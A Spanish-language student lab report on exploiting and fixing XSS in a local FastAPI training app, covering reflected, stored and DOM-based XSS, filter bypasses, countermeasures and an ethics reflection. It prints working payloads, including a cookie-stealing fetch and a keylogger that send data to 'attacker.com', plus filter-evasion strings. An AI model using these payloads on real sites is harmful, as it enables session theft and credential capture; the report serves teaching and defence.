# Laboratorio XSS - Análisis de Vulnerabilidades

## Información del Equipo
- **Integrante 1:** Sebastian David Gil Marin
- **Integrante 2:** Sebastian Andres Garces
- **Fecha:** Fecha de Entrega - 27 de octubre de 2025


### Distribución de Responsabilidades
- **Sebastian Gil:** Análisis de Reflected XSS y Stored XSS
- **Sebastian Garces:** Análisis de DOM-based XSS y Filter Bypass

---

## 1. Instalación y Configuración

### Requisitos Previos
- Python 3.8 o superior
- Git instalado
- Navegador web moderno (Chrome, Firefox o Edge)

### Pasos de Instalación

1. **Clonar el repositorio:**
```bash
git clone [URL-de-tu-fork]
cd cross-site-scripting-xss-lab
```

2. **Crear entorno virtual:**
```bash
python -m venv venv
```

3. **Activar entorno virtual:**
- Windows:
```bash
venv\Scripts\activate
```
- Linux/Mac:
```bash
source venv/bin/activate
```

4. **Instalar dependencias:**
```bash
pip install -r requirements.txt
```

5. **Ejecutar la aplicación:**
```bash
python main.py
```

6. **Acceder a la aplicación:**
Abrir navegador en `http://localhost:8000`

### Verificación de Funcionamiento
- La aplicación debe mostrar la página principal sin errores
- Todos los endpoints deben responder correctamente
- La base de datos SQLite debe cargarse automáticamente

### Troubleshooting Común
- **Error de puerto ocupado:** Cambiar puerto en `main.py` o cerrar aplicaciones que usen el puerto 8000
- **Dependencias faltantes:** Ejecutar `pip install --upgrade -r requirements.txt`
- **Base de datos no encontrada:** Verificar que el archivo `database.db` exista en el directorio raíz

---

## 2. Vulnerabilidades Identificadas

### 2.1 Reflected XSS

**Descripción Técnica:**
El Cross-Site Scripting Reflejado ocurre cuando datos no confiables del usuario se incluyen en la respuesta HTTP inmediata sin validación ni escape adecuado. El script malicioso se "refleja" desde el servidor web en la respuesta al usuario.

**Ubicación en la Aplicación:**
- **Endpoint:** `/search`
- **Parámetro vulnerable:** `q` (query de búsqueda)
- **Método HTTP:** GET

**Payload Exitoso:**
```html
<script>alert('XSS Reflected - Equipo [Nombres]')</script>
```

**URL Completa de Explotación:**
```
http://localhost:8000/search?q=<script>alert('XSS Reflected')</script>
```

**(INSERTAR CAPTURA 1: Pantalla mostrando el alert de XSS Reflected ejecutándose en el navegador)**

**Explicación Técnica:**
Este payload funciona porque:
1. El parámetro `q` se toma directamente de la URL
2. El servidor no realiza escape HTML de los caracteres especiales
3. El navegador interpreta la etiqueta `<script>` como código ejecutable
4. El JavaScript se ejecuta en el contexto de la página vulnerable

**Payload Alternativo (Robo de Cookies):**
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

**(INSERTAR CAPTURA 2: Consola del navegador mostrando document.cookie o resultado del payload)**

**Por qué es Peligroso:**
- Permite ejecución de código JavaScript arbitrario
- Puede robar sesiones de usuarios (cookies)
- Facilita ataques de phishing
- Requiere que la víctima haga clic en un enlace malicioso

---

### 2.2 Stored XSS

**Descripción Técnica:**
El XSS Almacenado (o Persistente) es el más peligroso. El payload malicioso se guarda en la base de datos del servidor y se ejecuta automáticamente cada vez que cualquier usuario accede a la página que muestra ese contenido.

**Ubicación en la Aplicación:**
- **Endpoint:** `/comments` (POST) y `/view-comments` (GET)
- **Campo vulnerable:** Campo de comentarios
- **Almacenamiento:** Base de datos SQLite

**Payload Exitoso:**
```html
<script>alert('XSS Stored - Todos los usuarios afectados')</script>
```

**Pasos de Explotación:**
1. Navegar al formulario de comentarios
2. Ingresar el payload en el campo de texto
3. Enviar el comentario
4. Observar que cualquier usuario que visite la página verá el alert

**(INSERTAR CAPTURA 3: Formulario de comentarios con el payload ingresado antes de enviarlo)**

**(INSERTAR CAPTURA 4: Alert ejecutándose cuando se visualizan los comentarios)**

**Payload Avanzado (Keylogger):**
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**Explicación Técnica:**
El payload es efectivo porque:
1. El comentario se almacena sin sanitización en la base de datos
2. Al renderizar la página de comentarios, no se aplica escape HTML
3. El navegador ejecuta el script automáticamente
4. Afecta a TODOS los usuarios que visiten la página (persistente)

**Diferencia con Reflected XSS:**
- **Stored:** Permanente, afecta a todos automáticamente
- **Reflected:** Temporal, requiere que cada víctima haga clic en un enlace

---

### 2.3 DOM-based XSS

**Descripción Técnica:**
El XSS basado en DOM ocurre completamente en el lado del cliente. El servidor nunca ve el payload malicioso; la vulnerabilidad está en el código JavaScript de la página que manipula el DOM de manera insegura.

**Ubicación en la Aplicación:**
- **Endpoint:** `/profile` o página con manipulación JavaScript del DOM
- **Función vulnerable:** JavaScript que usa `innerHTML` o `document.write()`
- **Fuente de datos:** URL hash (#) o parámetros procesados por JavaScript

**Payload Exitoso:**
```html
http://localhost:8000/profile#<img src=x onerror=alert('DOM XSS')>
```

**Código JavaScript Vulnerable:**
```javascript
// Ejemplo del código vulnerable en la aplicación
var userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;
```

**(INSERTAR CAPTURA 5: URL con el payload en el hash y el alert ejecutándose)**

**(INSERTAR CAPTURA 6: Consola del navegador mostrando el código JavaScript vulnerable o el DOM modificado)**

**Payload Alternativo:**
```html
#<svg onload=alert('DOM-XSS')>
```

**Explicación Técnica:**
Esta vulnerabilidad funciona porque:
1. El JavaScript del cliente lee datos de `location.hash`
2. Usa `innerHTML` para insertar el contenido sin sanitización
3. El navegador interpreta el HTML/JavaScript inyectado
4. El servidor NUNCA ve el payload (está después del `#`)

**Características Únicas:**
- No aparece en logs del servidor
- Más difícil de detectar con WAF tradicionales
- Requiere análisis del código JavaScript del cliente

---

### 2.4 Filter Bypass (Bonus)

**Descripción Técnica:**
Las técnicas de Filter Bypass permiten evadir filtros de seguridad mal implementados que intentan bloquear XSS pero tienen debilidades en su lógica de validación.

**Filtros Comunes y sus Bypasses:**

**Caso 1: Filtro que bloquea la palabra "script"**

Payload original (bloqueado):
```html
<script>alert('XSS')</script>
```

Bypass con mayúsculas/minúsculas:
```html
<ScRiPt>alert('XSS')</ScRiPt>
```

Bypass con codificación:
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

**(INSERTAR CAPTURA 7: Intento con payload normal siendo bloqueado)**

**(INSERTAR CAPTURA 8: Bypass exitoso ejecutándose)**

**Caso 2: Filtro que remueve etiquetas script**

Bypass con eventos HTML:
```html
<img src=x onerror=alert('XSS')>
```

```html
<body onload=alert('XSS')>
```

```html
<svg onload=alert('XSS')>
```

**Caso 3: Filtro que bloquea "alert"**

Bypass con codificación Unicode:
```html
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
```

Bypass con eval:
```html
<script>eval(String.fromCharCode(97,108,101,114,116))(1)</script>
```

**Caso 4: Filtro de comillas**

Bypass sin comillas:
```html
<script>alert(String.fromCharCode(88,83,83))</script>
```

```html
<script>alert`XSS`</script>
```

**(INSERTAR CAPTURA 9: Uno o dos ejemplos de bypass exitosos con diferentes técnicas)**

**Explicación de por qué funcionan:**
- **Case sensitivity:** Muchos filtros son case-sensitive y no detectan variaciones
- **Codificación:** Los navegadores decodifican automáticamente Unicode, HTML entities, etc.
- **Etiquetas alternativas:** Existen múltiples formas de ejecutar JavaScript sin `<script>`
- **Eventos HTML:** Casi cualquier etiqueta HTML puede tener eventos como `onerror`, `onload`

---

## 3. Técnicas de Explotación y Evidencias

### Resumen de Payloads Utilizados

| Tipo de XSS | Payload Principal | Complejidad | Impacto |
|-------------|-------------------|-------------|---------|
| Reflected | `<script>alert('XSS')</script>` | Baja | Alto |
| Stored | `<script>alert('Stored')</script>` | Media | Crítico |
| DOM-based | `#<img src=x onerror=alert('DOM')>` | Media | Alto |
| Filter Bypass | `<ScRiPt>alert('Bypass')</ScRiPt>` | Alta | Variable |

### Herramientas Utilizadas
- **Navegador:** Chrome DevTools (Consola e Inspector)
- **Captura:** Herramientas de screenshot del sistema
- **Análisis:** Burp Suite Community Edition (opcional)
- **Testing:** curl para pruebas de endpoints

### Proceso de Descubrimiento

1. **Reconocimiento:** Identificación de puntos de entrada de datos
2. **Prueba inicial:** Payloads básicos en cada campo
3. **Análisis de respuesta:** Verificación de cómo se refleja el input
4. **Explotación:** Payloads más sofisticados según el contexto
5. **Documentación:** Screenshots y código de evidencia

**(INSERTAR CAPTURA 10: Vista general de la aplicación mostrando los diferentes endpoints vulnerables)**

---

## 4. Análisis de Impacto y Contramedidas

### 4.1 Evaluación de Impacto CIA

#### Reflected XSS
- **Confidencialidad:** ⚠️ **ALTA** - Robo de cookies de sesión, tokens CSRF
- **Integridad:** ⚠️ **ALTA** - Modificación del contenido visual, defacement
- **Disponibilidad:** ⚠️ **MEDIA** - Posible DoS con scripts que consumen recursos

**Escenario de Ataque Real:**
Un atacante envía un correo con un enlace malicioso. La víctima hace clic y su sesión es robada.

#### Stored XSS
- **Confidencialidad:** 🔴 **CRÍTICA** - Robo masivo de credenciales de todos los usuarios
- **Integridad:** 🔴 **CRÍTICA** - Modificación permanente del contenido
- **Disponibilidad:** ⚠️ **ALTA** - Afecta a todos los usuarios automáticamente

**Escenario de Ataque Real:**
Un atacante inyecta un keylogger en comentarios. Todas las credenciales ingresadas en la página son capturadas.

#### DOM-based XSS
- **Confidencialidad:** ⚠️ **ALTA** - Robo de información del cliente
- **Integridad:** ⚠️ **ALTA** - Manipulación del DOM
- **Disponibilidad:** ⚠️ **MEDIA** - Afecta al cliente únicamente

**Escenario de Ataque Real:**
Un atacante explota un bug en el JavaScript para redirigir a una página de phishing idéntica.

---

### 4.2 Contramedidas Técnicas

#### Solución 1: Escape HTML (Para Reflected y Stored XSS)

**Código Vulnerable:**
```python
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# VULNERABLE: autoescape desactivado
templates.env.autoescape = False

@app.get("/search")
async def search(request: Request, q: str):
    # Sin sanitización
    return templates.TemplateResponse(
        "results.html", 
        {"request": request, "query": q}
    )
```

**Código Corregido:**
```python
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from html import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# SEGURO: autoescape activado
templates.env.autoescape = True

@app.get("/search")
async def search(request: Request, q: str):
    # Escape manual adicional por seguridad
    safe_query = escape(q)
    return templates.TemplateResponse(
        "results.html", 
        {"request": request, "query": safe_query}
    )
```

**Caracteres Escapados:**
- `<` se convierte en `&lt;`
- `>` se convierte en `&gt;`
- `"` se convierte en `&quot;`
- `'` se convierte en `&#x27;`
- `&` se convierte en `&amp;`

---

#### Solución 2: Content Security Policy (CSP)

**Implementación en FastAPI:**
```python
from fastapi import FastAPI
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

class CSPMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "font-src 'self'; "
            "connect-src 'self'; "
            "frame-ancestors 'none';"
        )
        return response

app = FastAPI()
app.add_middleware(CSPMiddleware)
```

**Explicación:**
- `default-src 'self'`: Solo permite recursos del mismo origen
- `script-src 'self'`: Solo permite scripts del mismo dominio
- `frame-ancestors 'none'`: Previene clickjacking

---

#### Solución 3: Validación de Entrada

**Código con Validación:**
```python
from pydantic import BaseModel, validator
import re

class CommentInput(BaseModel):
    comment: str
    
    @validator('comment')
    def validate_comment(cls, v):
        # Longitud máxima
        if len(v) > 500:
            raise ValueError('Comentario muy largo')
        
        # Lista negra de patrones peligrosos
        dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',  # eventos HTML
            r'<iframe',
            r'<object',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, v, re.IGNORECASE):
                raise ValueError('Contenido no permitido')
        
        return v

@app.post("/comments")
async def add_comment(comment_data: CommentInput):
    # El comentario ya está validado
    safe_comment = escape(comment_data.comment)
    # Guardar en base de datos...
    return {"status": "success"}
```

---

#### Solución 4: Sanitización para DOM XSS

**Código JavaScript Vulnerable:**
```javascript
// VULNERABLE
function displayUserInput() {
    var input = location.hash.substring(1);
    document.getElementById('output').innerHTML = input;
}
```

**Código JavaScript Corregido:**
```javascript
// SEGURO: Opción 1 - textContent
function displayUserInput() {
    var input = location.hash.substring(1);
    document.getElementById('output').textContent = input;
    // textContent no interpreta HTML
}

// SEGURO: Opción 2 - DOMPurify
function displayUserInputWithHTML() {
    var input = location.hash.substring(1);
    var clean = DOMPurify.sanitize(input);
    document.getElementById('output').innerHTML = clean;
}
```

**Incluir DOMPurify:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
```

---

### 4.3 Mejores Prácticas de Desarrollo Seguro

#### Principios Generales
1. **Nunca confiar en datos del usuario** - Siempre validar y sanitizar
2. **Defensa en profundidad** - Múltiples capas de seguridad
3. **Principio de menor privilegio** - Permisos mínimos necesarios
4. **Fail securely** - Los errores no deben comprometer la seguridad

#### Checklist de Seguridad XSS

- [ ] Activar autoescape en templates (Jinja2, Django, etc.)
- [ ] Usar `textContent` en lugar de `innerHTML` cuando sea posible
- [ ] Implementar Content Security Policy (CSP)
- [ ] Validar entrada del usuario (whitelist > blacklist)
- [ ] Sanitizar salida según contexto (HTML, JavaScript, CSS, URL)
- [ ] Usar bibliotecas de sanitización probadas (DOMPurify, Bleach)
- [ ] Configurar headers de seguridad (X-XSS-Protection, X-Content-Type-Options)
- [ ] Revisar código regularmente con herramientas SAST
- [ ] Capacitar al equipo en secure coding
- [ ] Realizar pentesting periódicos

#### Herramientas Recomendadas

**Para Prevención:**
- **DOMPurify:** Sanitización de HTML en el cliente
- **Bleach:** Sanitización de HTML en Python
- **OWASP Java Encoder:** Para aplicaciones Java
- **validator.js:** Validación de strings

**Para Detección:**
- **Burp Suite:** Scanner de vulnerabilidades
- **OWASP ZAP:** Proxy de seguridad open source
- **XSStrike:** Herramienta especializada en XSS
- **Acunetix:** Scanner comercial

**Para Testing:**
- **XSS Hunter:** Plataforma para blind XSS
- **Browser DevTools:** Análisis de DOM y requests
- **Postman:** Testing de APIs

---

### 4.4 Ejemplo Completo: Aplicación Segura

**main.py Corregido:**
```python
from fastapi import FastAPI, Request, HTTPException
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, validator
from html import escape
import re

app = FastAPI()

# Templates con autoescape activado
templates = Jinja2Templates(directory="templates")
templates.env.autoescape = True

# Middleware CSP
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    return response

# Modelo con validación
class SearchQuery(BaseModel):
    q: str
    
    @validator('q')
    def sanitize_query(cls, v):
        if len(v) > 100:
            raise ValueError('Query muy largo')
        # Escape adicional
        return escape(v)

@app.get("/search", response_class=HTMLResponse)
async def search(request: Request, q: str):
    try:
        validated = SearchQuery(q=q)
        return templates.TemplateResponse(
            "results.html",
            {"request": request, "query": validated.q}
        )
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
```

---

## 5. Reflexión Ética del Equipo

### Responsabilidad del Profesional en Ciberseguridad

Como futuros ingenieros de sistemas y profesionales en ciberseguridad, reconocemos que el conocimiento adquirido en este laboratorio implica una gran responsabilidad. Las técnicas de XSS que hemos aprendido son herramientas poderosas que pueden usarse tanto para proteger como para dañar sistemas y usuarios.

### Nuestros Compromisos Éticos

#### 1. Uso Exclusivo en Entornos Autorizados
**Nos comprometemos a:**
- Utilizar estas técnicas únicamente en entornos controlados y autorizados
- Nunca atacar sistemas reales sin permiso explícito y por escrito
- Respetar los límites del scope en cualquier actividad de pentesting
- Informar inmediatamente cualquier vulnerabilidad descubierta accidentalmente

#### 2. Principio de No Maleficencia
**Reconocemos que:**
- Cada vulnerabilidad XSS representa un riesgo real para usuarios finales
- Un ataque exitoso puede comprometer información sensible de personas reales
- Nuestra responsabilidad es proteger, no explotar
- El impacto de un ataque puede ir más allá de lo técnico, afectando vidas y organizaciones

#### 3. Divulgación Responsable
**Nos comprometemos a:**
- Seguir principios de divulgación responsable (Responsible Disclosure)
- Dar tiempo razonable a las organizaciones para corregir vulnerabilidades
- No publicar exploits funcionales de sistemas en producción
- Colaborar constructivamente con los equipos de seguridad

#### 4. Mejora Continua de la Seguridad
**Nuestro objetivo es:**
- Usar este conocimiento para construir aplicaciones más seguras
- Educar a otros desarrolladores sobre buenas prácticas
- Contribuir a la comunidad de seguridad de manera positiva
- Promover una cultura de "security by design" en nuestros proyectos

### Consideraciones Legales

#### Marco Legal Colombiano
Somos conscientes de que en Colombia:
- La Ley 1273 de 2009 penaliza el acceso abusivo a sistemas informáticos
- Realizar ataques sin autorización puede resultar en hasta 10 años de prisión
- La "intención de investigación" no es una defensa legal válida
- Las organizaciones pueden demandar civilmente por daños y perjuicios

#### Permisos y Autorizaciones
Para realizar cualquier actividad de seguridad legítima, necesitamos:
- Contrato o carta de autorización por escrito
- Scope claramente definido (sistemas, fechas, técnicas permitidas)
- Contactos de emergencia en caso de incidentes
- Acuerdos de confidencialidad (NDA) apropiados


### Conclusión

El poder de las técnicas XSS viene con la responsabilidad de usarlas éticamente. Como profesionales en formación, entendemos que nuestra labor es hacer de internet un lugar más seguro para todos. Este laboratorio no solo nos enseñó cómo funcionan los ataques, sino por qué es crucial defenderlos.

**Nuestro compromiso final:** Usar este conocimiento exclusivamente para propósitos legítimos de seguridad, educación y mejora de sistemas, respetando siempre las leyes, la ética profesional y los derechos de los usuarios.

---

## Referencias y Recursos Consultados

### Documentación Oficial
1. [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
2. [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
3. [MDN Web Docs - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
4. [OWASP Top 10 - 2021](https://owasp.org/www-project-top-ten/)

### Herramientas y Bibliotecas
5. [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
6. [FastAPI Security Best Practices](https://fastapi.tiangolo.com/tutorial/security/)
7. [Jinja2 Template Security](https://jinja.palletsprojects.com/en/3.1.x/api/#autoescaping)

### Artículos y Guías
8. Google Security Blog - XSS Prevention
9. HackerOne Disclosure Guidelines
10. Bugcrowd Vulnerability Rating Taxonomy

### Marco Legal
11. Ley 1273 de 2009 - Colombia (Delitos Informáticos)
12. Computer Fraud and Abuse Act (CFAA) - USA
13. GDPR - Protección de Datos

---

**Nota Final:** Este documento representa el trabajo colaborativo de nuestro equipo en el análisis de vulnerabilidades XSS con fines exclusivamente educativos. Todas las técnicas fueron probadas únicamente en el entorno controlado proporcionado para el laboratorio.
